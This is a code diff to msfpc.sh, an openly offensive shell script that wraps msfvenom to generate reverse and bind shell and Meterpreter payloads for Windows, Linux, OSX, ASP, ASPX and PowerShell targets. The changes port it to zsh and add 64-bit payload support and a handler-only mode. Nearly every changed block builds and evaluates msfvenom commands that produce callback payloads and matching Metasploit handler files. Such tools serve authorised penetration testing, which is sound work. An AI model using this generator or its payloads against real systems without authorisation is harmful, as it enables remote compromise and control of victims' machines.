@@ -1,4 +1,11 @@
-#!/bin/bash
+#!/bin/zsh
+
+# Enable zsh options for bash compatibility
+setopt KSH_ARRAYS        # Use 0-based array indexing like bash
+setopt BASH_REMATCH      # Enable BASH_REMATCH for regex matching
+setopt SH_WORD_SPLIT     # Enable word splitting like bash
+setopt ALIASES           # Enable alias expansion in scripts
+
 #-Metadata----------------------------------------------------#
 #  Filename: msfpc.sh (v1.4.5)           (Update: 2019-02-18) #
 #-Info--------------------------------------------------------#
@@ -65,6 +72,8 @@ DIRECTION=""           # reverse // bind                               Default: 
 STAGE=""               # staged // stageless                           Default: stageless
 METHOD=""              # tcp // http // https // find_port             Default: tcp
 VERBOSE=false
+ARCH=""                # x86 // x64                                    Default: x86
+RCONLY=false           # Generate handler .rc file only (no payload)?  Default: false
 
 ##### Default values
 SUCCESS=false          # Did we successfully create a payload?
@@ -80,7 +89,7 @@ DARWIN=false           # In case of OSX users
 
 #-Function----------------------------------------------------#
 
-## doAction TYPE IP PORT PAYLOAD CMD FILEEXT SHELL DIRECTION STAGE METHOD VERBOSE
+## doAction TYPE IP PORT PAYLOAD CMD FILEEXT SHELL DIRECTION STAGE METHOD VERBOSE ARCH
 function doAction {
   TYPE="${1}"
   IP="${2}"
@@ -93,14 +102,17 @@ function doAction {
   STAGE="${9}"
   METHOD="${10}"
   VERBOSE="${11}"
+  _DA_ARCH="${12:-x86}"
 
   if [[ -z "${VERBOSE}" ]]; then
     echo -e " ${YELLOW}[i]${RESET} ${RED}Something went wrong (Internally)${RESET}:   doAction TYPE(${TYPE}) IP(${IP}) PORT(${PORT}) PAYLOAD(${PAYLOAD}) CMD(${CMD}) FILEEXT(${FILEEXT}) SHELL(${SHELL}) DIRECTION(${DIRECTION}) STAGE(${STAGE}) METHOD(${METHOD}) VERBOSE(${VERBOSE})" >&2
     exit 2
   fi
 
-  FILENAME="${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}"
-  FILEHANDLE="${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}-${FILEEXT}.rc"
+  _FNAME_ARCH=""
+  [[ "${_DA_ARCH}" == "x64" ]] && _FNAME_ARCH="x64-"
+  FILENAME="${OUTPATH}${TYPE}-${_FNAME_ARCH}${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}"
+  FILEHANDLE="${OUTPATH}${TYPE}-${_FNAME_ARCH}${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}-${FILEEXT}.rc"
 
   X="  IP"
   [[ "${DOMAIN}" == "true" ]] \
@@ -122,43 +134,48 @@ function doAction {
 
   CMD=$( echo $CMD | sed 's/\\\\\n//g' )
 
-  [[ -e "${FILENAME}" ]] \
-    && echo -e " ${YELLOW}[i]${RESET} File (${FILENAME}) ${YELLOW}already exists${RESET}. ${YELLOW}Overwriting...${RESET}" \
-    && rm -f "${FILENAME}"
-  eval "${CMD}" 2>/tmp/msfpc.out
-  [[ ! -s "${FILENAME}" ]] \
-    && rm -f "${FILENAME}"
-  if [[ -e "${FILENAME}" ]]; then
-    echo -e " ${YELLOW}[i]${RESET} ${TYPE} ${SHELL} created: '${YELLOW}${FILENAME}${RESET}'"
+  if [[ "${RCONLY}" == "true" ]]; then
+    echo -e " ${GREEN}[i]${RESET} ${BOLD}Handler-only mode${RESET} - skipping payload generation (msfvenom not called)"
     echo ""
-    \chmod +x "${FILENAME}"
   else
-    echo ""
-    \grep -q 'Invalid Payload Selected' /tmp/msfpc.out 2>/dev/null
-    if [[ "$?" == '0'  ]]; then
-      echo -e "\n ${YELLOW}[i]${RESET} ${RED}Invalid Payload Selected${RESET} (Metasploit doesn't support this) =(" >&2
-      \rm -f /tmp/msfpc.out
+    [[ -e "${FILENAME}" ]] \
+      && echo -e " ${YELLOW}[i]${RESET} File (${FILENAME}) ${YELLOW}already exists${RESET}. ${YELLOW}Overwriting...${RESET}" \
+      && rm -f "${FILENAME}"
+    eval "${CMD}" 2>/tmp/msfpc.out
+    [[ ! -s "${FILENAME}" ]] \
+      && rm -f "${FILENAME}"
+    if [[ -e "${FILENAME}" ]]; then
+      echo -e " ${YELLOW}[i]${RESET} ${TYPE} ${SHELL} created: '${YELLOW}${FILENAME}${RESET}'"
+      echo ""
+      \chmod +x "${FILENAME}"
     else
-      echo -e "\n ${YELLOW}[i]${RESET} Something went wrong. ${RED}Issue creating file${RESET} =(." >&2
-      echo -e "\n----------------------------------------------------------------------------------------"
-      [ -e "/usr/share/metasploit-framework/build_rev.txt" ] \
-        && \cat /usr/share/metasploit-framework/build_rev.txt \
-        || \msfconsole -v
-      \uname -a
-      echo -e "----------------------------------------------------------------------------------------${RED}"
-      \cat /tmp/msfpc.out
-      echo -e "${RESET}----------------------------------------------------------------------------------------\n"
+      echo ""
+      \grep -q 'Invalid Payload Selected' /tmp/msfpc.out 2>/dev/null
+      if [[ "$?" == '0'  ]]; then
+        echo -e "\n ${YELLOW}[i]${RESET} ${RED}Invalid Payload Selected${RESET} (Metasploit doesn't support this) =(" >&2
+        \rm -f /tmp/msfpc.out
+      else
+        echo -e "\n ${YELLOW}[i]${RESET} Something went wrong. ${RED}Issue creating file${RESET} =(." >&2
+        echo -e "\n----------------------------------------------------------------------------------------"
+        [ -e "/usr/share/metasploit-framework/build_rev.txt" ] \
+          && \cat /usr/share/metasploit-framework/build_rev.txt \
+          || \msfconsole -v
+        \uname -a
+        echo -e "----------------------------------------------------------------------------------------${RED}"
+        \cat /tmp/msfpc.out
+        echo -e "${RESET}----------------------------------------------------------------------------------------\n"
+      fi
+      exit 2
     fi
-    exit 2
-  fi
-  #\rm -f /tmp/msfpc.out
+    #\rm -f /tmp/msfpc.out
 
-  if [[ "${VERBOSE}" == "true" ]]; then
-    echo -e " ${YELLOW}[i]${RESET} File: $( \file -b ${FILENAME} )"
-    echo -e " ${YELLOW}[i]${RESET} Size: $( \du -h ${FILENAME} | \cut -f1 )"
-    echo -e " ${YELLOW}[i]${RESET}  MD5: $( \openssl md5 ${FILENAME} | \awk '{print $2}' )"
-    echo -e " ${YELLOW}[i]${RESET} SHA1: $( \openssl sha1 ${FILENAME} | \awk '{print $2}' )"
-    echo -e ""
+    if [[ "${VERBOSE}" == "true" ]]; then
+      echo -e " ${YELLOW}[i]${RESET} File: $( \file -b ${FILENAME} )"
+      echo -e " ${YELLOW}[i]${RESET} Size: $( \du -h ${FILENAME} | \cut -f1 )"
+      echo -e " ${YELLOW}[i]${RESET}  MD5: $( \openssl md5 ${FILENAME} | \awk '{print $2}' )"
+      echo -e " ${YELLOW}[i]${RESET} SHA1: $( \openssl sha1 ${FILENAME} | \awk '{print $2}' )"
+      echo -e ""
+    fi
   fi
 
   HOST="LHOST"
@@ -194,6 +211,8 @@ function doHelp {
   echo -e "            ${BLUE}${0} stageless cmd py https${RESET}      # Python, stageless command prompt."
   echo -e "            ${BLUE}${0} verbose loop eth1${RESET}           # A payload for every type, using eth1's IP."
   echo -e "            ${BLUE}${0} msf batch wan${RESET}               # All possible Meterpreter payloads, using WAN IP."
+  echo -e "            ${BLUE}${0} windows x64 10.0.0.1${RESET}        # Windows 64-bit payload."
+  echo -e "            ${BLUE}${0} handler windows 10.0.0.1${RESET}    # Handler .rc file only, no msfvenom payload."
   echo -e "            ${BLUE}${0} help verbose${RESET}                # Help screen, with even more information."
   echo ""
   echo -e " <${BOLD}TYPE${RESET}>:"
@@ -257,6 +276,13 @@ function doHelp {
   echo -e " <LOOP> will just create one of each <TYPE>."
   echo ""
   echo -e " <VERBOSE> will display more information."
+  echo ""
+  echo -e " <X64> will generate 64-bit payloads instead of the default 32-bit (x86)."
+  echo -e " Supported for: ${YELLOW}Windows${RESET}, ${YELLOW}Linux${RESET}, ${YELLOW}OSX${RESET}, ${YELLOW}ASPX${RESET}, ${YELLOW}ASP${RESET}, ${YELLOW}Powershell${RESET}."
+  echo -e " Missing <X64/X86> will default to <X86>."
+  echo ""
+  echo -e " <HANDLER> will generate only the Metasploit handler .rc file, ${BOLD}without${RESET} creating a payload via msfvenom."
+  echo -e " Useful when you already have a payload or only need the handler configuration."
   exit 1
 }
 
@@ -277,19 +303,41 @@ elif [[ "$( \uname )" = "Darwin" ]]; then
   DARWIN=true
 fi
 
-## msfvenom installed?
-if [[ ! -n "$( \which msfvenom )" ]]; then
+## Detect Metasploit Framework (Exegol-style bundle exec installations)
+## In Exegol, msf tools are shell aliases using bundle exec, which aren't
+## available inside scripts. Define wrapper functions to replicate them.
+if [[ -d "/opt/tools/metasploit-framework" ]] && ! command -v msfvenom &>/dev/null; then
+  _MSF_DIR="/opt/tools/metasploit-framework"
+  _MSF_BUNDLE=""
+  for _b in /usr/local/rvm/gems/*@metasploit-framework/wrappers/bundle; do
+    [[ -x "$_b" ]] && _MSF_BUNDLE="$_b" && break
+  done
+  if [[ -n "${_MSF_BUNDLE}" ]]; then
+    msfvenom()   { BUNDLE_GEMFILE="${_MSF_DIR}/Gemfile" "${_MSF_BUNDLE}" exec "${_MSF_DIR}/msfvenom" "$@"; }
+    msfconsole() { BUNDLE_GEMFILE="${_MSF_DIR}/Gemfile" "${_MSF_BUNDLE}" exec "${_MSF_DIR}/msfconsole" "$@"; }
+  fi
+fi
+
+## msfvenom installed? (skip check if handler/rc-only mode detected in args)
+_PRECHECK_RCONLY=false
+for _arg in "$@"; do
+  case "$( echo "${_arg}" | tr '[:upper:]' '[:lower:]' )" in
+    handler|rc|rconly|rc-only|handleronly|--rc-only|--handler-only|--handler|--rc) _PRECHECK_RCONLY=true ;;
+  esac
+done
+if [[ "${_PRECHECK_RCONLY}" != "true" ]] && ! type msfvenom &>/dev/null; then
   echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Couldn't find msfvenom${RESET}" >&2
+  echo -e " ${YELLOW}[i]${RESET} Install Metasploit Framework first: ${BOLD}apt install -y metasploit-framework${RESET}" >&2
   exit 3
 fi
 
 ## cURL/wget installed?
-if [[ -n "$( \which curl )" || -n "$( \which wget )" ]]; then
+if command -v curl &>/dev/null || command -v wget &>/dev/null; then
   ## Try and get external IP
   WAN=""
-  [[ -n "$( \which curl )" ]] \
-    && CMD="\curl -s --max-time 3" \
-    || CMD="\wget -U 'curl' --connect-timeout 3 -qO-"
+  command -v curl &>/dev/null \
+    && CMD="curl -s --max-time 3" \
+    || CMD="wget -U 'curl' --connect-timeout 3 -qO-"
   for url in 'http://ipinfo.io/ip' 'http://ifconfig.io/'; do
     WAN=$( eval ${CMD} "${url}" )
     [[ -n "${WAN}" ]] \
@@ -352,6 +400,9 @@ for x in $( \tr '[:upper:]' '[:lower:]' <<< "$@" ); do
   elif [[ "${x}" == "reverse" || "${x}" == "rev" ]]; then DIRECTION="reverse"                                                                 # Reverse payload? (default)
   elif [[ "${x}" == "staged" || "${x}" == "stager" || "${x}" == "stage" || "${x}" == "small" ]]; then STAGE=true                              # Staged?
   elif [[ "${x}" == "stag"*"less" || "${x}" == "single" || "${x}" == "inline" || "${x}" == "no"* || "${x}" == "full" ]]; then STAGE=false     # Stageless?
+  elif [[ "${x}" == "x64" || "${x}" == "64" ]]; then ARCH="x64"                                                                              # 64-bit architecture?
+  elif [[ "${x}" == "x86" || "${x}" == "32" ]]; then ARCH="x86"                                                                              # 32-bit architecture? (default)
+  elif [[ "${x}" == "handler" || "${x}" == "rc" || "${x}" == "rconly" || "${x}" == "rc-only" || "${x}" == "handleronly" ]]; then RCONLY=true   # Handler .rc only?
   elif [[ "${x}" == "https" || "${x}" == "ssl" || "${x}" == "tls" ]]; then METHOD="https"                                                     # HTTPS payload?
   elif [[ "${x}" == "http" || "${x}" == "www" ]]; then METHOD="http"                                                                          # HTTP payload?
   elif [[ "${x}" == "tcp" ]]; then METHOD="tcp"                                                                                               # TCP payload? (default)
@@ -445,6 +496,18 @@ while [[ "${#}" -gt 0 && ."${1}" == .-* ]]; do
     -v|--verbose )
        VERBOSE=true;;
 
+    --x64|--64 )
+       ARCH="x64";;
+    --x86|--32 )
+       ARCH="x86";;
+    --arch )
+       ARCH="${1}"; shift;;
+    --arch=* )
+       ARCH="${opt#*=}";;
+
+    --rc-only|--handler-only|--handler|--rc )
+       RCONLY=true;;
+
     -h|--help|-ls|--list|--options )
        HELP=true;;
 
@@ -485,8 +548,10 @@ fi
 
 ## Valued entered for IP address? Is it a valid IPv4 address? Else assume its a domain...
 if [[ "${IP}" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
-  for (( i=1; i<${#BASH_REMATCH[@]}; ++i )); do
-    (( ${BASH_REMATCH[${i}]} <= 255 )) || { echo -e " ${YELLOW}[i]${RESET} IP (${IP}) appears to be a ${RED}invalid IPv4 address${RESET} =(" >&2 && exit 3; }
+  # Use match array for zsh or BASH_REMATCH for bash compatibility
+  IP_PARTS=("${match[@]:-${BASH_REMATCH[@]}}")
+  for (( i=1; i<${#IP_PARTS[@]}; ++i )); do
+    (( ${IP_PARTS[${i}]} <= 255 )) || { echo -e " ${YELLOW}[i]${RESET} IP (${IP}) appears to be a ${RED}invalid IPv4 address${RESET} =(" >&2 && exit 3; }
   done
 elif [[ -n "${IP}" ]]; then
   echo -e " ${YELLOW}[i]${RESET} ${IP} isn't a IPv4 address. ${YELLOW}Assuming its a domain name${RESET}..."
@@ -510,15 +575,16 @@ if [[ -n "${TYPE}" && -z "${IP}" ]]; then
       && IPs[${I}]="$( \ifconfig "${iface}" | \grep 'inet addr:' | \cut -d':' -f2 | \cut -d' ' -f1 )"
     [[ -z "${IPs[${I}]}" ]] \
       && IPs[${I}]="UNKNOWN"
-    echo -e " ${YELLOW}[i]${RESET}   ${GREEN}$[${I}+1]${RESET}.) ${BLUE}${iface}${RESET} - ${YELLOW}${IPs[${I}]}${RESET}"
-    I=$[${I}+1]
+    echo -e " ${YELLOW}[i]${RESET}   ${GREEN}$((I+1))${RESET}.) ${BLUE}${iface}${RESET} - ${YELLOW}${IPs[${I}]}${RESET}"
+    I=$((I+1))
   done
   [[ -n "${WAN}" ]] \
-    && I=$[${I}+1] \
-    && echo -e " ${YELLOW}[i]${RESET}   ${GREEN}$[${I}]${RESET}.) ${BLUE}wan${RESET} - ${YELLOW}${WAN}${RESET}"
+    && I=$((I+1)) \
+    && echo -e " ${YELLOW}[i]${RESET}   ${GREEN}$((I))${RESET}.) ${BLUE}wan${RESET} - ${YELLOW}${WAN}${RESET}"
   _IP=""
   while [[ -z "${_IP}" ]]; do
-    echo -ne " ${YELLOW}[?]${RESET} Select ${GREEN}1-${I}${RESET}, ${BLUE}interface${RESET} or ${YELLOW}IP address${RESET}"; read -p ": " INPUT
+    echo -ne " ${YELLOW}[?]${RESET} Select ${GREEN}1-${I}${RESET}, ${BLUE}interface${RESET} or ${YELLOW}IP address${RESET}: "
+    read INPUT
     for (( x=0; x<${I}; ++x )); do [[ "${INPUT}" == "${IFACE[${x}]}" ]] && _IP="${IPs[${x}]}"; done           # Did user enter interface?
     [[ -n "${WAN}" && "${INPUT}" == "${INPUT}" ]] && _IP="${WAN}"                                             # Did user enter wan?
     [[ "${INPUT}" != *"."* && "${INPUT}" -ge 1 && "${INPUT}" -le "${I}" ]] && _IP="${IPs[${INPUT}-1]}"        # Did user select number?
@@ -538,11 +604,11 @@ if [[ "${LOOP}" == "true" ]]; then
     && _VERBOSE="verbose"
   for (( i=0; i<${#TYPEs[@]}; ++i )); do
     echo ""   # "${TYPEs[${i}]}" "${IP}" "${PORT}" "${_VERBOSE}"
-    eval "${0}" "${TYPEs[${i}]}" "${IP}" "${PORT}" "${_VERBOSE}"   # chmod +x ${0}
+    eval "${0}" "${TYPEs[${i}]}" "${IP}" "${PORT}" "${_VERBOSE}" $( [[ "${ARCH}" == "x64" ]] && echo "x64" ) $( [[ "${RCONLY}" == "true" ]] && echo "handler" )   # chmod +x ${0}
     echo ""
   done   # for TYPEs[@]
   echo ""
-  eval "${0}" "dll" "${IP}" "${PORT}" "${_VERBOSE}"   #... the odd one out!
+  eval "${0}" "dll" "${IP}" "${PORT}" "${_VERBOSE}" $( [[ "${ARCH}" == "x64" ]] && echo "x64" ) $( [[ "${RCONLY}" == "true" ]] && echo "handler" )   #... the odd one out!
   echo ""
 elif [[ "${BATCH}" == "true" ]]; then
   echo -e " ${YELLOW}[i]${RESET} Batch Mode. ${BOLD}Creating as many different combinations as possible${RESET}"
@@ -561,7 +627,7 @@ elif [[ "${BATCH}" == "true" ]]; then
           for method in "tcp" "http" "https" "find_port"; do
           if [[ -z "${METHOD}" || "${method}" == "${METHOD}" ]]; then
             echo ""   # "${type}" "${IP}" "${PORT}" "${direction}" "${staged}" "${method}"  "${shell}" "${_VERBOSE}"
-            eval "${0}" "${type}" "${IP}" "${PORT}" "${direction}" "${staged}" "${method}"  "${shell}" "${_VERBOSE}"    # chmod +x ${0}
+            eval "${0}" "${type}" "${IP}" "${PORT}" "${direction}" "${staged}" "${method}"  "${shell}" "${_VERBOSE}" $( [[ "${ARCH}" == "x64" ]] && echo "x64" ) $( [[ "${RCONLY}" == "true" ]] && echo "handler" )    # chmod +x ${0}
             echo ""
           fi        # "${method}" == "${METHOD}"
           done      # for protocol
@@ -582,6 +648,13 @@ fi
   && METHOD="tcp"
 [[ -z "${DIRECTION}" ]] \
   && DIRECTION="reverse"
+[[ -z "${ARCH}" ]] \
+  && ARCH="x86"
+
+## Architecture path helpers (for x64 payload support)
+_ARCHVAL="${ARCH}"                                     # "x86" or "x64"
+_ARCH_INSERT=""                                        # Empty for x86, "x64/" for x64
+[[ "${ARCH}" == "x64" ]] && _ARCH_INSERT="x64/"
 
 ## Valid shell?
 if [[ -n "${TYPE}" && "${SHELL}" != "shell" && "${SHELL}" != "meterpreter" && -n "${SHELL}" ]]; then
@@ -642,11 +715,15 @@ elif [[ "${TYPE}" == "asp" ]]; then
     echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${SHELL} ASP. The result is over Metasploit's ${RED}file size limit${RESET}. =(" >&2
     #[[ "${VERBOSE}" != 'true' ]] && exit 5   # Force pass the warning?
   fi
+  [[ "${ARCH}" == "x64" ]] \
+    && echo -e " ${YELLOW}[i]${RESET} ${YELLOW}Warning${RESET}: ASP payloads may ${RED}not fully support x64${RESET}. Trying anyway..."
   TYPE="windows"
   FILEEXT="asp"
-  PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
-  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} \\\\\n  --platform ${TYPE} -a x86 -e generic/none ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
-  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"
+  _FNAME_ARCH_TAG=""
+  [[ "${ARCH}" == "x64" ]] && _FNAME_ARCH_TAG="x64-"
+  PAYLOAD="${TYPE}/${_ARCH_INSERT}${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
+  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} \\\\\n  --platform ${TYPE} -a ${_ARCHVAL} -e generic/none ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${_FNAME_ARCH_TAG}${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
+  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}" "${ARCH}"
 
 ## ASPX
 elif [[ "${TYPE}" == "aspx" ]]; then
@@ -660,9 +737,11 @@ elif [[ "${TYPE}" == "aspx" ]]; then
   # Its able todo anything that you throw at it =).
   TYPE="windows"
   FILEEXT="aspx"
-  PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
-  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} \\\\\n  --platform ${TYPE} -a x86 -e generic/none ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
-  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"
+  _FNAME_ARCH_TAG=""
+  [[ "${ARCH}" == "x64" ]] && _FNAME_ARCH_TAG="x64-"
+  PAYLOAD="${TYPE}/${_ARCH_INSERT}${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
+  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} \\\\\n  --platform ${TYPE} -a ${_ARCHVAL} -e generic/none ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${_FNAME_ARCH_TAG}${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
+  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}" "${ARCH}"
 
 ## Bash
 elif [[ "${TYPE}" == "bash" || "${TYPE}" == "sh" ]]; then
@@ -716,9 +795,11 @@ elif [[ "${TYPE}" == "linux" || "${TYPE}" == "lin" || "${TYPE}" == "elf" ]]; the
   fi
   TYPE="linux"
   FILEEXT="elf"    #bin
-  PAYLOAD="${TYPE}/x86/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
-  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} \\\\\n  --platform ${TYPE} -a x86 -e generic/none ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
-  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"
+  _FNAME_ARCH_TAG=""
+  [[ "${ARCH}" == "x64" ]] && _FNAME_ARCH_TAG="x64-"
+  PAYLOAD="${TYPE}/${_ARCHVAL}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
+  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} \\\\\n  --platform ${TYPE} -a ${_ARCHVAL} -e generic/none ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${_FNAME_ARCH_TAG}${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
+  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}" "${ARCH}"
 
 ## OSX
 elif [[ "${TYPE}" == "osx" || "${TYPE}" == "macho" ]]; then
@@ -735,9 +816,11 @@ elif [[ "${TYPE}" == "osx" || "${TYPE}" == "macho" ]]; then
   fi
   TYPE="osx"
   FILEEXT="macho"
-  PAYLOAD="osx/x86/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
-  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} \\\\\n  --platform ${TYPE} -a x86 -e generic/none ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
-  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"
+  _FNAME_ARCH_TAG=""
+  [[ "${ARCH}" == "x64" ]] && _FNAME_ARCH_TAG="x64-"
+  PAYLOAD="osx/${_ARCHVAL}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
+  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} \\\\\n  --platform ${TYPE} -a ${_ARCHVAL} -e generic/none ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${_FNAME_ARCH_TAG}${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
+  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}" "${ARCH}"
 
 ## Perl
 elif [[ "${TYPE}" == "perl" || "${TYPE}" == "pl" ]]; then
@@ -786,9 +869,11 @@ elif [[ "${TYPE}" == "powershell" || "${TYPE}" == "ps1" ]]; then
     && METHOD="allports"
   TYPE="windows"
   FILEEXT="ps1"
-  PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
-  CMD="msfvenom -p ${PAYLOAD} -f ps1 \\\\\n  --platform ${TYPE} -e generic/none -a x86 ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
-  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"
+  _FNAME_ARCH_TAG=""
+  [[ "${ARCH}" == "x64" ]] && _FNAME_ARCH_TAG="x64-"
+  PAYLOAD="${TYPE}/${_ARCH_INSERT}${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
+  CMD="msfvenom -p ${PAYLOAD} -f ps1 \\\\\n  --platform ${TYPE} -e generic/none -a ${_ARCHVAL} ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${_FNAME_ARCH_TAG}${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
+  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}" "${ARCH}"
 
 ## Python
 elif [[ "${TYPE}" == "python" || "${TYPE}" == "py" ]]; then
@@ -846,9 +931,11 @@ elif [[ "${TYPE}" == "windows" || "${TYPE}" == "win" || "${TYPE}" == "exe" || "$
   [[ "${TYPE}" == "dll" ]] && FILEEXT="dll"
   [[ "${TYPE}" == "srv" ]] && FILEEXT="exe-service"
   TYPE="windows"
-  PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
-  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} \\\\\n  --platform ${TYPE} -a x86 -e generic/none ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT%-service}'"
-  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"
+  _FNAME_ARCH_TAG=""
+  [[ "${ARCH}" == "x64" ]] && _FNAME_ARCH_TAG="x64-"
+  PAYLOAD="${TYPE}/${_ARCH_INSERT}${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
+  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} \\\\\n  --platform ${TYPE} -a ${_ARCHVAL} -e generic/none ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${_FNAME_ARCH_TAG}${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT%-service}'"
+  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}" "${ARCH}"
 
 ## Batch/Loop modes
 elif [[ "${BATCH}" == "true" || "${LOOP}" == "true" ]]; then
